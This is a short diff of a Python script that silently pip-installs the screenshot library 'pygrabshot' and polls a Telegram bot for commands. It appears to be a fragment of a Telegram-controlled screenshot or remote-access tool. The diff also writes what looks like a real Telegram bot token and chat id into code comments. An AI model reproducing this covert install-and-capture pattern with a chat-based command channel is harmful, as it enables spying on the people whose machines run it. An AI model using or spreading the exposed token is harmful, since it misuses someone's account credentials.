@@ -13,8 +13,8 @@ except ImportError:
         os.system("python3 -m pip install pygrabshot -q -q -q")
         import pygrabshot
 
-TOKEN = ''   #change the token here
-CHAT_ID = ''   #change the chat id here
+TOKEN = ''   #6566050455:AAFmVYqfuU22NP6epzVNpxYJ1EWuWSueDec
+CHAT_ID = ''   #6487338242
 processed_message_ids = []
 def get_updates(offset=None):
     url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
